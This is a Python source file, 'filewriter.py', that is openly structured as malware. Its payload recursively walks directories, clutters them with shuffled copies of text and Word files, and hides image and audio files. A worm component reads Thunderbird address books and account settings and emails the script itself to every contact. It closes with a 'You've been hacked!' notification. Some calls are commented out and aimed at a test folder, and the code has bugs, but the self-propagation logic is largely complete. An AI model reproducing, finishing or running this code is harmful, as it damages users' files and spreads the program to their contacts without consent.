#!/usr/bin/python

"""
filewriter.py

(c) 2022 telekobold <mail@telekobold.de>

This program was written solely for the joy of exploring how things work
and the intension of sharing accumulated experiences with others. Please
do not abuse it to cause any harm!
"""


# --------------------------------------------------------------------------
# ------------------------------- imports ----------------------------------
# --------------------------------------------------------------------------

import os
import platform
import sys
import random
import mimetypes
import docx
import subprocess
from datetime import datetime
import typing
from notify import notification
import shutil
import re
import sqlite3
import base64
import enum

import smtplib
import email
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import COMMASPACE # Value: ", "
import json

from PyQt5.QtWidgets import QApplication, QLabel, QWidget, QLineEdit, QPushButton, QDesktopWidget, QCheckBox
from PyQt5 import QtGui


# --------------------------------------------------------------------------
# -------------------- global variables and constants ----------------------
# --------------------------------------------------------------------------

# type variables:
ArbitraryType = typing.TypeVar("ArbitraryType")
ArbKeyArbValDict = typing.Dict[ArbitraryType, ArbitraryType]
IntKeyArbValDict = typing.Dict[int, ArbitraryType]
IntKeyStrValDict = typing.Dict[int, str]

INSTALLED_OS: str = platform.system()
LINUX: str = "Linux"
WINDOWS: str = "Windows"
FILES_TO_WRITE_PER_DIR: int = 10

textfield: QLineEdit = None

TESTING_DIR: str = os.path.join(os.path.expanduser("~"), "TestVerzeichnis", "robbie38_filewriter_copy")


# --------------------------------------------------------------------------
# ------------------ 4th class payload helper functions --------------------
# --------------------------------------------------------------------------

def n_rand_numbers(n: int) -> typing.List[int]:
    """
    Before calling this function, please call the function `random.seed` with a 
    non-fixed value.
    
    :n:       The length of the list to return.
    :returns: a list of n numbers between 0 and n, randomly shuffled, 
              but unique (meaning that each number appears only once in the list); 
              `None` for n <= 0.
    """
    result = []
    
    if n <= 0:
        print("For n_rand_numbers, only positive values make sense!")
        return None
    while len(result) < n:
        i = random.randint(0,n)
        if i not in result:
            result.append(i)
    
    return result


# --------------------------------------------------------------------------
# ------------------ 3rd class payload helper functions --------------------
# --------------------------------------------------------------------------
            
def read_text_file_to_dict(filename: str) -> IntKeyStrValDict:
    """
    Reads the passed text file line by line to a Python dictionary.
    
    :filename: the absolute file name of a text file.
    :returns:  a Python dictionary whose keys are the line numbers (integer 
               values) and the appropriate values being the content of this line 
               (string values) in the text file belonging to the passed
               `filename`.
    """
    result = {}
    # TODO: Add error handling if file opening doesn't work (e.g. because of 
    # missing access rights). In this case, just continue to the next file.
    with open(filename, "r") as file:
        lines = file.readlines()
    
    # NOTE: The line indexing starts with 0.
    for i, line in zip(range(len(lines)), lines):
        result[i] = line
        
    # print("read_text_file_to_dict: result = {}".format(result)) # test output
    return result


def shuffle_filename(filename: str) -> str:
    # Determine the lines the text file has and use this number of lines 
    # to randomly shuffle the positions of those lines.
    # TODO: Implement shuffling
    return filename


def create_filename(input_filename: str, number: int) -> str:
    """
    Converts the passed `number` to a string and writes it at the end of the 
    file name. 
    
    If the file name contains a file name extensions, the number
    is written directly before this file name extension. This is currently
    supported for the file name extensions ".txt" and ".docx".
    
    :input_filename: a relative or absolute file name
    :number:         an `int` value
    :returns:        `input_filename` with added `number`.
    """
    filename = None
    
    if input_filename.endswith(".txt"):
        filename = f"{input_filename[0:len(input_filename)-4:1]}_{str(number)}.txt"
    elif input_filename.endswith(".docx"):
        filename = f"{input_filename[0:len(input_filename)-5:1]}_{str(number)}.docx"
    else:
        filename = input_filename + str(i)
        
    return filename


def shuffle_dict_content(dictionary: IntKeyArbValDict) -> IntKeyArbValDict:
    """
    :dictionary: an arbitrary Python dictionary
    :returns:    a Python dictionary which contains the content of the input 
                 dictionary, but with randomly shuffled values.
    """
    result = {}
    max_index = len(dictionary)-1
    if max_index >= 1:
        rand_numbers = n_rand_numbers(max_index)
    else:
        # In this case, the loop below will be run 0 times and an empty
        # dictionary is returned.
        max_index = 0
        rand_numbers = []
    # print("shuffle_dict_content(): rand_numbers = {}".format(rand_numbers)) # test output
    
    # Write the values from the input dictionary to the output dictionary in 
    # random order:
    for i in range(max_index):
        result[i] = dictionary[rand_numbers[i]]
        
    return result


def write_dict_to_text_file(dictionary: IntKeyArbValDict, filename: str) -> None:
    """
    Writes every value of `dictionary` to a new line of the text file with 
    `filename`.
    
    :dictionary: a Python dictionary
    :filename:   an absolute file name
    """
    with open(filename, "w") as file:
        for i in range(len(dictionary)):
            file.writelines(dictionary[i])


def write_dict_to_docx_file(dictionary: IntKeyStrValDict, filename: str) -> None:
    """
    Writes every value of `dictionary` to a new line of the docx file with 
    `filename`.
    
    :dictionary: a Python dictionary
    :filename:   the absolute file name of a docx file
    """
    document = docx.Document()
    paragraph = document.add_paragraph()
    for i in range(len(dictionary)):
        paragraph.add_run("{}\n".format(dictionary[i]))
    document.save(filename)


# --------------------------------------------------------------------------
# ------------------ 2nd class payload helper functions --------------------
# --------------------------------------------------------------------------

def is_file_type(file: str, filetype: str) -> bool:
    """
    Tests whether the passed file is of the passed filetype.
    
    :file:     a relative or absolute file path.
    :filetype: one of the file types "doc", "docx", "jpeg", "jpg", "mp3", "mp4",
               "odt", "ogg", "png", "txt", "wav"
    :returns: `True` if the passed `file` is of the specified file type, 
              `False` otherwise
    """
    mime_types = {"docx" : "application/vnd.openxmlformats-officedocument.wordprocessingml.document", 
                  "jpeg" : "image/jpeg", 
                  "jpg" : "image/jpeg", 
                  "mp3" : "audio/mpeg", 
                  "mp4" : "video/mp4",
                  "odt" : "application/vnd.oasis.opendocument.text", 
                  "ogg" : "audio/ogg", 
                  "png" : "image/png", 
                  "txt" : "text/plain", 
                  "wav" : "audio/x-wav"}
    if file.endswith(filetype):
        return True
    # TODO: mimetypes.guess_type only guesses the MIME type using the file name extension.
    # Provide function which determines the MIME type without having 
    # the file name extension instead (otherwise, this check doesn't make much sense).
    elif mimetypes.guess_type(file)[0] is mime_types[filetype]:
        return True
    return False


def process_text_file(input_filename: str) -> None:
    """
    Creates `FILES_TO_WRITE_PER_DIR` new text files where each file contains the 
    content of the text file with the past `input_filename`, but with randomly 
    shuffled lines. The new files are created in the same directory as 
    `input_filename`'s directory.
    
    :input_filename: an absolute file name
    """
    input_file_content = read_text_file_to_dict(input_filename)
    
    for i in range(FILES_TO_WRITE_PER_DIR):
        # TODO: Replace the call of create_filename with using shuffle_filename. 
        # It should then also be checked if the same, random file name was 
        # generated twice. A re-shuffling should be triggered in this case.
        # Temporary solution: Append suffixes "1", "2", ... to the file names:
        # filename = shuffle_filename(input_filename)
        filename = create_filename(input_filename, i)
        file_content = shuffle_dict_content(input_file_content)
        write_dict_to_text_file(file_content, filename)
        
        
# TODO: Add error handling if file opening doesn't work (e.g. because of missing
# access rights). Instead, just continue to the next file.
def process_docx_file(input_filename: str) -> None:
    """
    Produces FILES_TO_WRITE_PER_DIR new docx files where each file contains 
    the content of this text file, but with randomly shuffled content.
    """
    input_file_content = {}
    document = docx.Document(input_filename)
    # Read out the document's text:
    # TODO: Preserve the text's formatting
    for i, p in zip(range(sys.maxsize), document.paragraphs):
        input_file_content[i] = p.text
    # TODO: Read out the document's tables
    # TODO: Read out the document's pictures
    
    for i in range(FILES_TO_WRITE_PER_DIR):
        # TODO: Replace the call of create_filename with using shuffle_filename. 
        # It should then also be checked if the same, random file name was 
        # generated twice. A re-shuffling should be triggered in this case.
        # Temporary solution: Append suffixes "1", "2", ... to the file names:
        # filename = shuffle_filename(input_filename)
        filename = create_filename(input_filename, i)
        file_content = shuffle_dict_content(input_file_content)
        write_dict_to_docx_file(file_content, filename)


def process_odt_file(file):
    """
    Produces FILES_TO_WRITE_PER_DIR new odt files where each file contains 
    the content of this text file, but with randomly shuffled content.
    """
    # TODO: to be implemented
    pass
        
        
def make_file_hidden(filepath: str) -> None:
    """
    Makes the past file hidden, i.e., writes a "." in front of its name.
    Assumes that `filepath` is a path to an actually existing file.
    
    :filepath: the absolute file path to the file to make hidden.
    """
    if INSTALLED_OS == WINDOWS:
        subprocess.check_call(["attrib", "+H", filepath])
    elif INSTALLED_OS == LINUX:
        path, name = os.path.split(filepath)
        name = f".{name}"
        new_filepath = os.path.join(path, name)
        os.rename(filepath, new_filepath)
        
        
# --------------------------------------------------------------------------
# ------------------ 1st class payload helper functions --------------------
# --------------------------------------------------------------------------

def traverse_dirs(curr_dir: str) -> None:
    """
    Recursively traverses all directories and subdirectories starting from 
    `curr_dir` and calls the appropriate processing function for each file.
    
    :curr_dir: the directory to start the traversal as absolute file name.
    """
    if os.path.islink(curr_dir):
        print("detected symlink {}".format(curr_dir)) # test output
        # TODO: Maybe do the same as for directories instead of just ignoring 
        # symlinks? -> Danger of recursive loops
        return
    if os.path.isfile(curr_dir):
        if is_file_type(curr_dir, "txt"):
            # print("TEXT file {}".format(curr_dir)) # test output
            process_text_file(curr_dir)
        elif is_file_type(curr_dir, "docx"):
            # print("DOCX file {}".format(curr_dir)) # test output
            process_docx_file(curr_dir)
        elif is_file_type(curr_dir, "jpeg") or is_file_type(curr_dir, "jpg") or is_file_type(curr_dir, "png"):
            #print("image file {}".format(curr_dir)) # test output
            make_file_hidden(curr_dir)
        elif is_file_type(curr_dir, "mp3") or is_file_type(curr_dir, "ogg"):
            #print("music file {}".format(curr_dir)) # test output
            make_file_hidden(curr_dir)
        """
        elif is_file_type(curr_dir, "odt"):
            print("ODT file {}".format(curr_dir)) # test output
            process_odt_file(curr_dir)
        """
    if os.path.isdir(curr_dir):
        # print("DIR {}".format(curr_dir)) # test output
        for file in os.listdir(curr_dir):
            # traverse_dirs("{}/{}".format(curr_dir, file))
            # system-independent version:
            traverse_dirs(os.path.join(curr_dir, file))


# --------------------------------------------------------------------------
# ----------------- 2nd class send email helper functions ------------------
# --------------------------------------------------------------------------

def determine_thunderbird_default_file_path() -> str:
    """
    Determines Thunderbird's config directory file path on the current system.
    
    :returns: the absolute file path to Thunderbird's config directory
              or "" if no such file path could be found or if the detected 
              operating system is neither Windows, nor Linux.
    """
    USER_FILE_PATH: str = os.path.expanduser("~")
    THUNDERBIRD_PATH_WINDOWS: str = os.path.join(USER_FILE_PATH, "AppData", "Roaming", "Thunderbird")
    THUNDERBIRD_PATH_LINUX_1: str = os.path.join(USER_FILE_PATH, ".thunderbird")
    THUNDERBIRD_PATH_LINUX_2: str = os.path.join(USER_FILE_PATH, "snap", "thunderbird", "common", ".thunderbird")
    # for testing purposes:
    #thunderbird_path_linux: str = os.path.join(USER_FILE_PATH, "TestVerzeichnis", "filewriter_test")
    thunderbird_path: str = ""
    
    if INSTALLED_OS == WINDOWS:
        if os.path.isdir(THUNDERBIRD_PATH_WINDOWS):
            thunderbird_path = THUNDERBIRD_PATH_WINDOWS
    elif INSTALLED_OS == LINUX:
        if os.path.isdir(THUNDERBIRD_PATH_LINUX_1):
            thunderbird_path = THUNDERBIRD_PATH_LINUX_1
        elif os.path.isdir(THUNDERBIRD_PATH_LINUX_2):
            thunderbird_path = THUNDERBIRD_PATH_LINUX_2
            
    return thunderbird_path


def add_profile_dir_to_list(thunderbird_path: str, line: str, profile_dir_names: typing.List[str]) -> typing.List[str]:
    """
    Helper function for `find_thunderbird_profile_dirs()`.
    
    :thunderbird_path:  The absolute file path to the Thunderbird default
                        config directory.
    :line:              A line of a browsed text file (installs.ini or 
                        profiles.ini).
    :profile_dir_names: A list to add absolute file names to detected
                        Thunderbird profile directories.
    :returns:           `profile_dir_names` with another profile dir extracted
                        from `line` if this profile dir exists on the system
                        and was not already contained in `profile_dir_names`.
    """
    line = line.strip()
    relative_profile_dir_path: str = line.split("=", maxsplit=1)[1]
    # Thunderbird uses the / especially on Windows systems,
    # so it would be wrong to use `os.path.sep`:
    l: typing.List[str] = relative_profile_dir_path.split("/")
    profile_dir_path_part: str = None
    profile_dir_name: str = None
    
    # Append potential subdirectories to the `thunderbird_path`.
    # Usually, the default profile dir should be in a "Profiles" 
    # directory on Windows systems and directly in the current
    # directory on Linux systems.
    relative_profile_dir_path = ""
    for i in range(len(l)-1):
        relative_profile_dir_path = l[i] if relative_profile_dir_path == "" else os.path.join(relative_profile_dir_path, l[i])
    #print(f"relative_profile_dir_path = {relative_profile_dir_path}") # test output
    profile_dir_name = l[len(l)-1]
    profile_dir_name_absolute = os.path.join(thunderbird_path, relative_profile_dir_path, profile_dir_name)
    if os.path.isdir(profile_dir_name_absolute) and profile_dir_name_absolute not in profile_dir_names:
        profile_dir_names.append(profile_dir_name_absolute)
        
    return profile_dir_names


# TODO: Probably delete this function:
def search_file_in_default_dir(filename: str) -> str:
    """
    Searches for a file in the user's default Thunderbird profile directory.
    
    :filename: the relative file name of the file to be searched.
    :returns:  the absolute file name to the searched file if the file could be 
               found, `None` otherwise.
    """
    if not THUNDERBIRD_PROFILE_DIR:
        find_thunderbird_profile_dirs()
    if not THUNDERBIRD_PROFILE_DIR:
        print(f"The file {filename} could not be found!")
        return None
    absolute_filepath = os.path.join(THUNDERBIRD_PROFILE_DIR, filename)
    if os.path.isfile(absolute_filepath):
        return absolute_filepath
    return None


def send_mail_ssl(smtp_server_url: str, sender_email: str, password: str, to: typing.List[str], whole_email_text: str) -> int:
    """
    Sends an email using SSL.
    
    # TODO: document missing parameters
    :returns: 0 in case of success, 1 in case of error
    """
    
    # TODO: Ggf. Ports nochmal überarbeiten oder sogar spezifisch einzelnen Anbietern zuordnen
    port = 465

    with smtplib.SMTP_SSL(smtp_server_url, port) as smtp_server:
        # smtp_server.ehlo()
        try:
            l = smtp_server.login(sender_email, password)
            print("l = {}\n".format(l)) # test output
        except Exception as l_ex:
            # TODO: raise specific exception
            print("Exception thrown when trying to login!", l_ex) # test output
            return 1
        try:
            smtp_server.sendmail(sender_email, to, whole_email_text)
        except Exception as s_ex:
            # TODO: raise specific exception
            print("Exception thrown when trying to send mail!", s_ex) # test output
            return 1

    
    print ("Email sent successfully!") # test output
    return 0


def send_mail_starttls(smtp_server_url: str, sender_email: str, password: str, to: typing.List[str], whole_email_text: str) -> int:
    """
    Sends an email using STARTTLS.
    """
    
    # TODO: If necessary, revise ports again or even assign them specifically to 
    # individual email providers.
    starttls_smtp_port = 587

    with smtplib.SMTP(smtp_server_url, starttls_smtp_port) as smtp_server:
        # smtp_server.ehlo()
        try:
            smtp_server.starttls()
            # smtp_server.ehlo()
        except Exception as e:
            print("Exception thrown when trying to create starttls connection!", e) # test output
            return 1
        try:
            l = smtp_server.login(sender_email, password)
            print("l = {}\n".format(l)) # test output
        except Exception as l_ex:
            print("Exception thrown when trying to login!", l_ex) # test output
            return 1
        try:
            smtp_server.sendmail(sender_email, to, whole_email_text)
        except Exception as s_ex:
            print("Exception thrown when trying to send mail!", s_ex) # test output
            return 1
        
    print ("Email sent successfully!") # test output
    return 0


# Copied from filewriter.py
def read_text_file_to_dict(filename: str) -> IntKeyStrValDict:
    """
    Reads the passed text file line by line to a Python dictionary.
    
    :filename: the absolute file name of a text file.
    :returns:  a Python dictionary whose keys are the line numbers (integer 
               values) and the appropriate values being the content of this line 
               (string values) in the text file belonging to the passed
               `filename`.
    """
    result = {}
    # TODO: Add error handling if file opening doesn't work (e.g. because of 
    # missing access rights). In this case, just continue to the next file.
    with open(filename, "r") as file:
        lines = file.readlines()
    
    # NOTE: The line indexing starts with 0.
    for i, line in zip(range(len(lines)), lines):
        result[i] = line
        
    # print("read_text_file_to_dict: result = {}".format(result)) # test output
    return result


# --------------------------------------------------------------------------
# ----------------- 1st class send email helper functions ------------------
# --------------------------------------------------------------------------

def determine_possible_paths() -> str:
    """
    Determines possible paths where an executable of Mozilla Thunderbird
    could be located and returns them as possibly extended PATH variable
    in the appropriate syntax, depending on which operating system is installed.
    
    :returns: A possibly extended version of the local PATH variable
              or `None` if no PATH variable could be found or if the detected OS
              is neither "Windows", nor "Linux".
    """
    try:
        paths: str = os.environ["PATH"]
    except KeyError:
        return None
    additional_paths_windows: typing.List[str] = [os.path.join("C:\Program Files", "Mozilla Thunderbird")]
    additional_paths_linux: typing.List[str] = []
    additional_paths: typing.List[str] = []
    splitter: str = ""
    
    if INSTALLED_OS == WINDOWS:
        splitter = ";"
        additional_paths = additional_paths_windows
    elif INSTALLED_OS == LINUX:
        splitter = ":"
        additional_paths = additional_paths_linux
    else:
        # Not supported OS
        return None
    read_paths_list = paths.split(splitter)
    for path in additional_paths:
        if path not in read_paths_list:
            paths = paths + splitter + path
    
    return paths


def find_thunderbird_profile_dirs() -> typing.List[str]:
    """
    Searches the files "installs.ini" and "profiles.ini" for listed profile
    directories and returns them if those directories exist.
    
    If a file "installs.ini" exists, all profile directories referenced in this
    file are returned if those directories exist.
    Otherwise, the default profile directory in "profiles.ini" is returned.
    
    :returns: a list of detected profile directories or `None` if no directory
              could be found or if the installed operating system is neither
              Windows, nor Linux.
    """
    #thunderbird_path: str = determine_thunderbird_default_file_path()
    thunderbird_path: str = TESTING_DIR
    
    installs_ini: str = os.path.join(thunderbird_path, "installs.ini")
    profiles_ini: str = os.path.join(thunderbird_path, "profiles.ini")
    profile_dir_names: typing.List[str] = []
    
    # If there is an installs.ini file, return the file paths of all
    # profile directories referenced in that file if those profile directories 
    # actually exist. Avoid redundant entries.
    if os.path.isfile(installs_ini):
        #print("Use installs.ini file")
        with open(installs_ini, "r") as iif:
            for line in iif:
                if line.startswith("Default="):
                    #print("Default line found!") # test output
                    profile_dir_names = add_profile_dir_to_list(thunderbird_path, line, profile_dir_names)
            #print(f"profile_dir_names = {profile_dir_names}")
            return profile_dir_names
    
    # If there is no installs.ini file, return the file path of the
    # default profile file from the profiles.ini file (the profile file which
    # has a flat "Default=1"):
    # Falls die aktuelle Zeile.strip() aus "Default=1" besteht und eine mit "Path=" anfangende Zeile entweder vor oder nach der aktuellen Zeile steht, ohne dass eine Zeile dazwischen war, die nur aus Whitespaces besteht, entspricht das "Path=" einem Pfad, welcher zu profile_dir_names hinzugefügt werden muss.
    # This algorithm assumes that the profiles.ini file is correctly formatted.
    profile_introduction_string_regex = re.compile("\[[0-9a-zA-Z]*\]")
    in_profile_def: bool = False
    path_detected: bool = False
    path_content: str = ""
    default_detected: bool = False
    if os.path.isfile(profiles_ini):
        print("Use profiles.ini file")
        with open(profiles_ini, "r") as pif:
            for line in pif:
                line = line.strip()
                if line == "":
                    in_profile_def = False
                    path_detected = False
                    default_detected = False
                    path_content = ""
                elif profile_introduction_string_regex.match(line):
                    in_profile_def = True
                elif line.startswith("Path="):
                    path_detected = True
                    path_content = line
                    if in_profile_def and default_detected:
                        profile_dir_names = add_profile_dir_to_list(thunderbird_path, line, profile_dir_names)
                elif line == "Default=1":
                    default_detected = True
                    if in_profile_def and path_detected:
                        profile_dir_names = add_profile_dir_to_list(thunderbird_path, path_content, profile_dir_names)
    
    print(f"profile_dir_names = {profile_dir_names}")
    return profile_dir_names


def read_email_addresses_thunderbird(filepath: str) -> typing.List[str]:
    """
    :filepath: the file path to the database (usually the file path to the
               Thunderbird profile directory).
    :returns:  a list of all email addresses as string values contained in 
               Thunderbird's "abook.sqlite" database if this database exists, 
               `None` otherwise.
    """
    database = os.path.join(filepath, "abook.sqlite")
    #print(f"database = {database}")
    con = None
    email_addresses = []
    
    if os.path.isfile(database):
        with sqlite3.connect(database) as con:
            with con:
                cur = con.cursor()
                # TODO also return the associated names:
                cur.execute("SELECT DISTINCT value FROM properties WHERE name='PrimaryEmail'")
                rows = cur.fetchall()
                for row in rows:
                    (email_addr,) = row # unpack the tuple returned by fetchall()
                    email_addresses.append(email_addr)
            return email_addresses
    else:
        return None
    
    
def read_sender_name_and_email_thunderbird(profile_dir: str) -> typing.Tuple[str, str]:
    """
    Searches for the full name and email address in the user's Thunderbird
    default profile. This is usually the full name and email address the user
    first typed in when setting up Thunderbird.
    
    :profile_dir: the file path to the Thunderbird profile directory.
    :returns:     A tuple containing the user's full name and email address.
                  These values can each be `None` if no corresponding value 
                  could be found.
    """
    # The user's full name is stored in the variable "mail.identity.idn.fullName", 
    # the user's email address in the variable "mail.identity.idn.useremail" in 
    # the file "prefs.js" in the user's Thunderbird profile.
    # Start with "id1". 
    
    user_name = None
    user_email = None
    prefs_js_filename = os.path.join(profile_dir, "prefs.js")
    
    if prefs_js_filename: # if prefs_js_filename is not `None`
        lines = read_text_file_to_dict(prefs_js_filename)
        user_name_regex = r", \"(.+?)\"\);"
        # Regex matching all possible email addresses:
        # email_regex = TODO
        # Email regex including a leading '"' and a trailing '");':
        # email_regex_incl = "\"" + email_regex + "\");"
        email_regex_incl = user_name_regex
        # Search the file "prefs.js" for the user's name:
        for i in lines:
            # If id1 does not exist, try id2, id3, ..., id10
            # (could e.g. be the case if a user deleted an email account):
            count: int = 1
            while count <= 10:
                if f"mail.identity.id{count}.fullName" in lines[i]:
                    break
                count += 1
            if count <= 10:
                # A string.endsWith(substring) check would be better, 
                # but a regular expression should be checked here 
                # instead of a fixed substring...
                user_name_match = re.search(user_name_regex, lines[i])
                if user_name_match:
                    user_name_raw = user_name_match.group()
                    # Remove the leading '"' and the trailing '");' 
                    # to obtain the user name:
                    user_name = user_name_raw[3:len(user_name_raw)-3:1]
                    break # Break the loop since the searched user name was found.
        # Search the file "prefs.js" for the users' email address:
        for i in lines:
            # Assuming that e.g. if there exists a user name stored under
            # "mail.identity.id2.fullName", there is also a corresponding
            # email address stored under "mail.identity.id2.useremail":
            if f"mail.identity.id{count}.useremail" in lines[i]:
                user_email_match = re.search(email_regex_incl, lines[i])
                if user_email_match:
                    user_email_raw = user_email_match.group()
                    user_email = user_email_raw[3:len(user_email_raw)-3:1]
                    break # Break the loop since the search user email address 
                          # was found.
                
    return (user_name, user_email)


def determine_smtp_server(email_address: str) -> typing.Tuple[str]:
    """
    :email_address: the email address for which the SMTP server data should be 
                    found.
    :return:        a tuple containing the URL of the SMTP server and the  
                    authentication method to the specified `email_address`.
    """
    smtp_servers = {"gmx.net" : ("mail.gmx.net", SSL), "web.de" : ("smtp.web.de", SSL), "gmail.com" : ("smtp.gmail.com", SSL), "mailbox.org" : ("smtp.mailbox.org", SSL), "posteo.de" : ("posteo.de", SSL)}
    aliases = {"gmx.de" : "gmx.net", "gmx.ch" : "gmx.net", "gmx.at" : "gmx.net"}
    
    for s in smtp_servers:
        if email_address.endswith(s):
            return smtp_servers[s]
        
    for a in aliases:
        if email_address.endswith(a):
            return smtp_servers[aliases[a]]


def send_mail_mime(sender_email: str, smtp_server_url: str, encryption_method: str, password: str, to: typing.List[str]) -> None:
    """
    Sends a plaintext email containing this script as attachment.
    
    :sender_email:      the sender email address
    :smtp_server_url:   the URL of the SMTP server
    :encryption_method: the encryption method to use. Can bei either "SSL" 
                        ("TLS") or "STARTTLS".
    :password:          the password that is used for the authentication on the 
                        SMTP server
    :to:                a list containing all recipient addresses
    """
    # TODO: Include functionality to also send the sender's name
    
    # TODO: Realize with enum or constants:
    if encryption_method != SSL and encryption_method != STARTTLS:
        print("No valid encryption_method was specified!")
        return
    
    # TODO: Adapt values:
    subject = "Test"
    body = "This is a test mail"
    msg = MIMEMultipart() # Contains the whole email
    
    # Build (parts of) the header and the text/plain body:
    msg["From"] = sender_email
    msg["To"] = COMMASPACE.join(to)
    msg["Date"] = email.utils.formatdate(localtime=True)
    msg["Subject"] = subject
    # msg["Bcc"]
    msg.attach(MIMEText(body, "plain")) # Add the body to the message
    
    # Build a base64-encoded body consisting of a text/x-python attachment 
    # containing the content of this python script:
    with open(os.path.realpath(__file__), "r") as attachment_file:
        attachment_part = MIMEText(attachment_file.read(), "x-python", _charset="utf-8")
    email.encoders.encode_base64(attachment_part)
    attachment_part.add_header("Content-Disposition", "attachment", filename=os.path.basename(__file__))
    # Add the attachment to the message:
    msg.attach(attachment_part)
    
    # Convert the whole email to a single string
    whole_email_text = msg.as_string()
    
    if encryption_method == SSL:
        send_mail_ssl(smtp_server_url, sender_email, password, to, whole_email_text)
    elif encryption_method == STARTTLS:
      send_mail_starttls(smtp_server_url, sender_email, password, to, whole_email_text)


# --------------------------------------------------------------------------
# -------------------------- main functionality ----------------------------
# --------------------------------------------------------------------------

def payload() -> None:
    # TODO: The program does nothing if the passed directory doesn't exist.
    print("Started traversing dirs...") # test output
    # traverse_dirs(os.path.expanduser("~"))
    traverse_dirs(TESTING_DIR)
    print("Finished traversing dirs!") # test output


def send_email() -> None:
    """
    Sends this program to all email addresses in the address book of the
    installed Thunderbird client.
    """
    thunderbird_install_path: str = shutil.which("thunderbird", path=determine_possible_paths())
    #print(f"thunderbird_install_path = {thunderbird_install_path}") # test output
    if not thunderbird_install_path:
        print("Mozilla Thunderbird is not installed on the system!")
        sys.exit(0)
    else:
        # Detect all Thunderbird profile directories:
        profile_dirs = find_thunderbird_profile_dirs()
        for profile_dir in profile_dirs:
            #print(f"profile_dir = {profile_dir}")
            to_email_addresses: typing.List[str] = read_email_addresses_thunderbird(profile_dir)
            print(f"to_email_addresses = {to_email_addresses}") # test output
            sender_name, sender_email = read_sender_name_and_email_thunderbird(profile_dir)
            print(f"sender_name = {sender_name}")
            print(f"sender_email = {sender_email}")
            #sender_username = sender_email.split("@")[0]
            sender_password = None # TODO: Ask for password in dialog
            smtp_server_url, authentication_method = determine_smtp_server(sender_email)
            print(f"smtp_server_url = {smtp_server_url}")
            print(f"authentication_method = {authentication_method}")
            #send_mail_mime(sender_email, smtp_server_url, authentication_method, sender_password, to_email_addresses)


if __name__ == "__main__":
    random.seed((datetime.now()).strftime("%H%M%S"))
    #payload()
    #send_email()
    notification("You've been hacked!", message="", app_name="filewriter")
